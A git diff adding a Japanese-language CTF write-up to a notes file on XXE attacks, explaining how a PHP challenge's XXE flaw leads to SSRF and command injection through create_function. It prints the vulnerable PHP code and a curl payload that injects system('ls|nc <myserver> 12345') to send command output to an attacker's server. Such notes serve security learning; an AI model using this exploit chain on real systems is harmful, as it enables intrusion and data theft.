@@ -365,11 +365,76 @@ $phar->stopBuffering();
       </flowRoot>
 </svg>
 ```
-## sample
+## (OOB) XXE (SSRF to localhost / Command Injection)
+https://graneed.hatenablog.com/entry/2019/01/28/023500   
 - **entrypoint**   
+ソースコードが与えられて`Admin::sort($_REQUEST['rss'],$_REQUEST['order'])`にRCEの脆弱性があることがわかるが、ローカルからしかアクセスできないように制限されている。なので、XXEを使ってSSRFによってリクエストを送信してRCEする。幸い、`simplexml_load_string`に入力が入っているのでXXEに対して脆弱。   
+応答が返ってこないが今回はSSRFをするだけでよくて、コンテンツを攻撃者サーバーに送り付ける必要がないため、SSRFでよい。   
 - **概要**   
+以下がXXEに脆弱な箇所。   
+```php
+class Custom extends Controller{
+  public static function Test($string){
+      $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
+      $test = $root->name;
+      echo $test;
+  }
+```
+以下の`usort`の部分が、第1引数に配列、第二引数にコールバック関数を指定しており、後者は`create_function`によって無名関数が文字列`''`で囲まれて宣言されている。ここに`aa||system('id')`を挿入可能なのでCommand Injection可能。   
+```php
+class Admin extends Controller{
+  public static function sort($url,$order){
+    $uri = parse_url($url);
+    $file = file_get_contents($url);
+    $dom = new DOMDocument();
+    $dom->loadXML($file,LIBXML_NOENT | LIBXML_DTDLOAD);
+    $xml = simplexml_import_dom($dom);
+    if($xml){
+     //echo count($xml->channel->item);
+     //var_dump($xml->channel->item->link);
+     $data = [];
+     for($i=0;$i<count($xml->channel->item);$i++){
+       //echo $uri['scheme'].$uri['host'].$xml->channel->item[$i]->link."\n";
+       $data[] = new Url($i,$uri['scheme'].'://'.$uri['host'].$xml->channel->item[$i]->link);
+       //$data[$i] = $uri['scheme'].$uri['host'].$xml->channel->item[$i]->link;
+     }
+     //var_dump($data);
+     usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
+     echo '<div class="ui list">';
+     foreach($data as $dt) {
+       $html = '<div class="item">';
+       $html .= ''.$dt->id.' - ';
+       $html .= ' <a href="'.$dt->link.'">'.$dt->link.'</a>';
+       $html .= '</div>';
+     }
+     $html .= "</div>";
+     echo $html;
+    }else{
+     $html .= "Error, not found XML file!";
+     $html .= "<code>";
+     $html .= "<pre>";
+     $html .= $file;
+     $html .= "</pre>";
+     $hmlt .= "</code>";
+     echo $html;
+    }
+  }
+}
+```
 - **Payload**   
-
+以下のXMLファイルを攻撃者サーバーに用意しておく。これは`usort`関数が実行されるようにするため。   
+```txt
+<root>
+<channel>
+<item><link>aaa</link></item>
+<item><link>bbb</link></item>
+</channel>
+</root>
+```
+以下でRCE！   
+```txt
+curl "http://68.183.31.62:94/custom" -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/admin?rss=http://<myserver>/hoge.xml&order=hoge%7C%7Csystem%28%27ls%7Cnc%20<myserver>%2012345%27%29" >]><foo>&xxe;</foo>'
+```
 # メモ
 `hackerone report xxe`とかでググるといろいろ出てくる。   
 `xxe ctf`,`xxe vulnhub`,`xxe hackthebox`とか。   
